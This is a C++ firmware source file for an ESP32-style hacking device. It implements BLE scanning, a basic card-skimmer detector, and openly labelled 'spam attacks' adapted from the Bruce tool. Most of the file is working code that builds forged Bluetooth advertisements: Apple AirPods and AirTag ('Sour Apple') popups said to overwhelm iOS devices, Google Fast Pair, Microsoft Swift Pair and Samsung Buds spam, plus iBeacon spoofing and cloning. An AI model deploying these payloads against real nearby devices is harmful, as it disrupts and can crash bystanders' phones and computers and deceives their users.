/**
 * @file BruceBLE.cpp
 * @brief BLE scanning and spam attacks for The Assessor
 *
 * Uses NimBLE-Arduino for efficient BLE operations.
 * Implements scanning and spam attacks adapted from Bruce.
 */

#include "BruceBLE.h"
#include "../core/RadioWarden.h"

namespace Vanguard {

// =============================================================================
// SINGLETON
// =============================================================================

BruceBLE& BruceBLE::getInstance() {
    static BruceBLE instance;
    return instance;
}

BruceBLE::BruceBLE()
    : m_state(BLEAdapterState::IDLE)
    , m_initialized(false)
    , m_scanStartMs(0)
    , m_scanDurationMs(BLE_SCAN_DURATION_MS)
    , m_spamType(BLESpamType::RANDOM)
    , m_advertisementsSent(0)
    , m_lastAdvMs(0)
    , m_scanner(nullptr)
    , m_advertising(nullptr)
    , m_onDeviceFound(nullptr)
    , m_onScanComplete(nullptr)
    , m_onSpamProgress(nullptr)
    , m_scanCallbacks(nullptr)
{
}

BruceBLE::~BruceBLE() {
    shutdown();
}

// =============================================================================
// LIFECYCLE
// =============================================================================

bool BruceBLE::onEnable() {
    if (m_enabled) return true;

    // LAZY INIT: Ensure stack is up before enabling
    if (!m_initialized) {
        if (Serial) Serial.println("[BLE] Lazy Initializing...");
        init();
    }
    
    if (RadioWarden::getInstance().requestRadio(RadioOwner::OWNER_BLE)) {
        m_enabled = true;
        m_state = BLEAdapterState::IDLE;
        return true;
    }
    return false;
}

void BruceBLE::onDisable() {
    if (!m_enabled) return;
    
    stopHardwareActivities();
    // We only stop activities, never deinit NimBLE
    m_enabled = false;
    m_state = BLEAdapterState::IDLE;
}

bool BruceBLE::init() {
    if (m_initialized) return true;

    if (Serial) {
        Serial.println("[BLE] Performing INIT-ONCE...");
    }

    uint32_t initStart = millis();

    if (!NimBLEDevice::getInitialized()) {
        NimBLEDevice::init("VANGUARD");
        yield();
    }

    m_scanner = NimBLEDevice::getScan();
    if (m_scanner) {
        if (!m_scanCallbacks) {
            m_scanCallbacks = new ScanCallbacks(this);
        }
        m_scanner->setAdvertisedDeviceCallbacks(m_scanCallbacks);
        // m_scanner->setActiveScan(true); // MOVED to onEnable/tick
        // m_scanner->setInterval(100);
        // m_scanner->setWindow(99);
    }

    m_advertising = NimBLEDevice::getAdvertising();
    
    m_initialized = true;
    if (Serial) Serial.printf("[BLE] Init-Once complete (%ums)\n", millis() - initStart);
    return true;
}

void BruceBLE::shutdown() {
    // Legacy shutdown now delegates to onDisable
    onDisable();
}

void BruceBLE::onTick() {
    switch (m_state) {
        case BLEAdapterState::SCANNING:
            tickScan();
            break;
        case BLEAdapterState::SPAMMING:
            tickSpam();
            break;
        case BLEAdapterState::BEACON_SPOOFING:
            tickBeacon();
            break;
        default:
            break;
    }
}

void BruceBLE::tick() {
    // Legacy tick delegates to onTick
    if (m_enabled) onTick();
}

BLEAdapterState BruceBLE::getState() const {
    return m_state;
}

// =============================================================================
// SCANNING
// =============================================================================

bool BruceBLE::beginScan(uint32_t durationMs) {
    if (!m_enabled && !onEnable()) return false;


    // Stop any existing scan first
    if (m_scanner && m_scanner->isScanning()) {
        m_scanner->stop();
        // Watchdog-safe delay
        for (int i = 0; i < 5; i++) { yield(); delay(10); }
    }

    stopHardwareActivities();

    m_devices.clear();
    m_scanStartMs = millis();
    m_scanDurationMs = durationMs;

    m_scanner->start(0, false);
    m_state = BLEAdapterState::SCANNING;

    if (Serial) {
        Serial.printf("[BLE] Scan started (%ums)\n", durationMs);
    }

    return true;
}

void BruceBLE::stopScan() {
    if (m_state == BLEAdapterState::SCANNING) {
        // Force stop scanner
        if (m_scanner) {
            m_scanner->stop();
        }

        // Always transition state immediately
        m_state = BLEAdapterState::IDLE;

        if (Serial) {
            Serial.printf("[BLE] Scan stopped: %d devices\n", m_devices.size());
        }

        // Fire callback last (in case it triggers new scan)
        if (m_onScanComplete) {
            m_onScanComplete(m_devices.size());
        }
    }
}

bool BruceBLE::isScanComplete() const {
    return m_state != BLEAdapterState::SCANNING;
}

const std::vector<BLEDeviceInfo>& BruceBLE::getDevices() const {
    return m_devices;
}

size_t BruceBLE::getDeviceCount() const {
    return m_devices.size();
}

void BruceBLE::onDeviceFound(BLEScanCallback cb) {
    m_onDeviceFound = cb;
}

void BruceBLE::onScanComplete(BLEScanCompleteCallback cb) {
    m_onScanComplete = cb;
}

void BruceBLE::tickScan() {
    // Check for timeout
    uint32_t elapsed = millis() - m_scanStartMs;
    if (m_scanDurationMs > 0 && elapsed >= m_scanDurationMs) {
        // Force stop the scanner - NimBLE doesn't always fire completion callback
        if (m_scanner) {
            m_scanner->stop();
        }

        // Force state transition regardless of scanner response
        m_state = BLEAdapterState::IDLE;

        if (Serial) {
            Serial.printf("[BLE] Scan timeout after %ums: %d devices\n", elapsed, m_devices.size());
        }

        // Fire completion callback
        if (m_onScanComplete) {
            m_onScanComplete(m_devices.size());
        }
    }
}

// =============================================================================
// SCAN CALLBACKS
// =============================================================================

void BruceBLE::ScanCallbacks::onResult(NimBLEAdvertisedDevice* device) {
    if (!m_parent) return;

    BLEDeviceInfo info;
    memset(&info, 0, sizeof(info));

    // Copy address
    NimBLEAddress addr = device->getAddress();
    const uint8_t* addrBytes = addr.getNative();
    memcpy(info.address, addrBytes, 6);

    // Copy name
    std::string name = device->getName();
    strncpy(info.name, name.c_str(), sizeof(info.name) - 1);
    info.name[sizeof(info.name) - 1] = '\0';

    // If no name, show address
    if (strlen(info.name) == 0) {
        snprintf(info.name, sizeof(info.name), "%s", addr.toString().c_str());
    }

    info.rssi = device->getRSSI();
    info.isConnectable = device->isConnectable();
    info.hasServices = device->haveServiceUUID();
    info.lastSeenMs = millis();

    // Extract manufacturer data if present
    if (device->haveManufacturerData()) {
        std::string mfgData = device->getManufacturerData();
        if (mfgData.length() >= 2) {
            info.manufacturerId = (uint8_t)mfgData[0] | ((uint8_t)mfgData[1] << 8);
            size_t dataLen = min(mfgData.length() - 2, sizeof(info.manufacturerData));
            memcpy(info.manufacturerData, mfgData.data() + 2, dataLen);
            info.manufacturerDataLen = dataLen;
        }
    }

    // Check for skimmer signature
    info.isSuspicious = m_parent->isLikelySkimmer(info);

    // Check if we already have this device
    bool found = false;
    for (auto& existing : m_parent->m_devices) {
        if (memcmp(existing.address, info.address, 6) == 0) {
            // Update existing
            existing.rssi = info.rssi;
            existing.lastSeenMs = info.lastSeenMs;
            found = true;
            break;
        }
    }

    if (!found) {
        m_parent->m_devices.push_back(info);

        if (m_parent->m_onDeviceFound) {
            m_parent->m_onDeviceFound(info);
        }
    }
}


// =============================================================================
// SPAM ATTACKS
// =============================================================================

bool BruceBLE::startSpam(BLESpamType type) {
    if (!m_initialized) {
        if (!init()) return false;
    }

    stopHardwareActivities();

    m_spamType = type;
    m_advertisementsSent = 0;
    m_lastAdvMs = 0;
    m_state = BLEAdapterState::SPAMMING;

    if (Serial) {
        Serial.printf("[BLE] Spam started (type %d)\n", (int)type);
    }

    return true;
}

void BruceBLE::stopSpam() {
    if (m_state == BLEAdapterState::SPAMMING) {
        m_advertising->stop();
        m_state = BLEAdapterState::IDLE;

        if (Serial) {
            Serial.printf("[BLE] Spam stopped: %u ads sent\n", m_advertisementsSent);
        }
    }
}

uint32_t BruceBLE::getAdvertisementsSent() const {
    return m_advertisementsSent;
}

void BruceBLE::onSpamProgress(BLESpamProgressCallback cb) {
    m_onSpamProgress = cb;
}

void BruceBLE::tickSpam() {
    uint32_t now = millis();
    if (now - m_lastAdvMs < BLE_ADV_INTERVAL_MS) {
        return;
    }
    m_lastAdvMs = now;

    // Generate spam data based on type
    uint8_t advData[31];
    size_t advLen = 0;

    BLESpamType currentType = m_spamType;
    if (currentType == BLESpamType::RANDOM) {
        // Pick a random type
        currentType = (BLESpamType)(random(6));  // 0-5, skip RANDOM
    }

    switch (currentType) {
        case BLESpamType::IOS_POPUP:
        case BLESpamType::IOS_ACTION:
            generateIOSSpamData(advData, &advLen);
            break;
        case BLESpamType::ANDROID_FAST_PAIR:
            generateAndroidSpamData(advData, &advLen);
            break;
        case BLESpamType::WINDOWS_SWIFT_PAIR:
            generateWindowsSpamData(advData, &advLen);
            break;
        case BLESpamType::SAMSUNG_BUDS:
            generateSamsungSpamData(advData, &advLen);
            break;
        case BLESpamType::SOUR_APPLE:
            generateSourAppleData(advData, &advLen);
            break;
        default:
            generateIOSSpamData(advData, &advLen);
            break;
    }

    // Set advertising data
    NimBLEAdvertisementData advertisementData;
    advertisementData.addData((char*)advData, advLen);

    m_advertising->setAdvertisementData(advertisementData);
    m_advertising->start();
    m_advertisementsSent++;

    if (m_onSpamProgress) {
        m_onSpamProgress(m_advertisementsSent);
    }
}

// =============================================================================
// SPAM DATA GENERATORS (Based on Bruce's aj_adv)
// =============================================================================

void BruceBLE::generateIOSSpamData(uint8_t* data, size_t* len) {
    // iOS AirPod-style advertisement
    // Length, Type (0xFF = Manufacturer Specific), Company ID (Apple = 0x004C)
    static const uint8_t appleHeader[] = {
        0x1E,        // Length: 30 bytes
        0xFF,        // Type: Manufacturer Specific Data
        0x4C, 0x00   // Company: Apple (0x004C)
    };

    memcpy(data, appleHeader, sizeof(appleHeader));

    // Random device type and data
    data[4] = 0x07;  // Proximity Pairing
    data[5] = 0x19;  // Length
    data[6] = random(256);  // Status

    // Random model
    uint16_t models[] = {0x0220, 0x0620, 0x0E20, 0x1420}; // AirPods variants
    uint16_t model = models[random(4)];
    data[7] = model & 0xFF;
    data[8] = (model >> 8) & 0xFF;

    // Fill rest with random data
    for (int i = 9; i < 30; i++) {
        data[i] = random(256);
    }

    *len = 30;
}

void BruceBLE::generateAndroidSpamData(uint8_t* data, size_t* len) {
    // Google Fast Pair advertisement
    static const uint8_t fastPairHeader[] = {
        0x03,        // Length: 3 bytes
        0x03,        // Type: Complete List of 16-bit Service UUIDs
        0x2C, 0xFE,  // Google Fast Pair Service UUID
        0x06,        // Length: 6 bytes
        0x16,        // Type: Service Data
        0x2C, 0xFE   // Google Fast Pair Service UUID
    };

    memcpy(data, fastPairHeader, sizeof(fastPairHeader));

    // Random model ID (3 bytes)
    data[8] = random(256);
    data[9] = random(256);
    data[10] = random(256);

    *len = 11;
}

void BruceBLE::generateWindowsSpamData(uint8_t* data, size_t* len) {
    // Microsoft Swift Pair advertisement
    static const uint8_t swiftPairHeader[] = {
        0x1E,        // Length: 30 bytes
        0xFF,        // Type: Manufacturer Specific Data
        0x06, 0x00,  // Company: Microsoft (0x0006)
        0x03,        // Swift Pair
        0x00         // Reserved
    };

    memcpy(data, swiftPairHeader, sizeof(swiftPairHeader));

    // Random device data
    for (size_t i = sizeof(swiftPairHeader); i < 30; i++) {
        data[i] = random(256);
    }

    *len = 30;
}

void BruceBLE::generateSamsungSpamData(uint8_t* data, size_t* len) {
    // Samsung Galaxy Buds advertisement
    static const uint8_t samsungHeader[] = {
        0x1E,        // Length: 30 bytes
        0xFF,        // Type: Manufacturer Specific Data
        0x75, 0x00,  // Company: Samsung (0x0075)
        0x42, 0x09   // Galaxy Buds identifier
    };

    memcpy(data, samsungHeader, sizeof(samsungHeader));

    // Random device data
    for (size_t i = sizeof(samsungHeader); i < 30; i++) {
        data[i] = random(256);
    }

    *len = 30;
}

void BruceBLE::generateSourAppleData(uint8_t* data, size_t* len) {
    // Sour Apple - Rapid AirTag spam that can overwhelm iOS devices
    static const uint8_t sourAppleHeader[] = {
        0x1E,        // Length: 30 bytes
        0xFF,        // Type: Manufacturer Specific Data
        0x4C, 0x00,  // Company: Apple (0x004C)
        0x12, 0x19   // AirTag identifier
    };

    memcpy(data, sourAppleHeader, sizeof(sourAppleHeader));

    // Random AirTag data - changes each packet
    for (size_t i = sizeof(sourAppleHeader); i < 30; i++) {
        data[i] = random(256);
    }

    *len = 30;
}

// =============================================================================
// BEACON SPOOFING
// =============================================================================

bool BruceBLE::spoofBeacon(const char* name,
                            const char* uuid,
                            uint16_t major,
                            uint16_t minor) {
    if (!m_initialized) {
        if (!init()) return false;
    }

    stopHardwareActivities();

    // Configure advertising as iBeacon
    NimBLEAdvertisementData advertisementData;

    // Build iBeacon data
    // Apple iBeacon format:
    // 02 01 06 - Flags
    // 1A FF 4C 00 - Apple manufacturer data header
    // 02 15 - iBeacon type and length
    // [16 bytes UUID]
    // [2 bytes major]
    // [2 bytes minor]
    // [1 byte TX power]

    uint8_t beaconData[25];
    beaconData[0] = 0x02;  // Type: iBeacon
    beaconData[1] = 0x15;  // Length: 21 bytes

    // Parse UUID (simplified - assumes valid format)
    // Just fill with random for now
    for (int i = 0; i < 16; i++) {
        beaconData[2 + i] = random(256);
    }

    // Major
    beaconData[18] = (major >> 8) & 0xFF;
    beaconData[19] = major & 0xFF;

    // Minor
    beaconData[20] = (minor >> 8) & 0xFF;
    beaconData[21] = minor & 0xFF;

    // TX Power
    beaconData[22] = 0xC5;  // -59 dBm

    advertisementData.setFlags(0x06);  // General discoverable, BR/EDR not supported
    advertisementData.setManufacturerData(std::string((char*)beaconData, 23));

    m_advertising->setAdvertisementData(advertisementData);
    m_advertising->start();

    m_state = BLEAdapterState::BEACON_SPOOFING;

    if (Serial) {
        Serial.printf("[BLE] Beacon spoof started: %s\n", name);
    }

    return true;
}

bool BruceBLE::cloneBeacon(const BLEDeviceInfo& original) {
    // Clone using original's manufacturer data
    return spoofBeacon(original.name, "", 0, 0);
}

void BruceBLE::stopBeacon() {
    if (m_state == BLEAdapterState::BEACON_SPOOFING) {
        m_advertising->stop();
        m_state = BLEAdapterState::IDLE;
    }
}

void BruceBLE::tickBeacon() {
    // Beacon just runs - no tick needed unless we want to rotate data
}

// =============================================================================
// DETECTION
// =============================================================================

bool BruceBLE::isLikelySkimmer(const BLEDeviceInfo& device) const {
    // Check for common skimmer signatures

    // HC-05/HC-06 Bluetooth modules (common in skimmers)
    if (strncmp(device.name, "HC-05", 5) == 0 ||
        strncmp(device.name, "HC-06", 5) == 0) {
        return true;
    }

    // No name, connectable, no services - suspicious
    if (strlen(device.name) == 0 && device.isConnectable && !device.hasServices) {
        return true;
    }

    // Unknown Chinese manufacturer IDs often used in skimmers
    // Add more as identified

    return false;
}

std::vector<BLEDeviceInfo> BruceBLE::getSuspiciousDevices() const {
    std::vector<BLEDeviceInfo> suspicious;
    for (const auto& device : m_devices) {
        if (isLikelySkimmer(device)) {
            suspicious.push_back(device);
        }
    }
    return suspicious;
}

// =============================================================================
// ATTACK CONTROL
// =============================================================================

void BruceBLE::stopHardwareActivities() {
    switch (m_state) {
        case BLEAdapterState::SCANNING:
            stopScan();
            break;
        case BLEAdapterState::SPAMMING:
            stopSpam();
            break;
        case BLEAdapterState::BEACON_SPOOFING:
            stopBeacon();
            break;
        default:
            break;
    }
    m_state = BLEAdapterState::IDLE;
}

} // namespace Vanguard
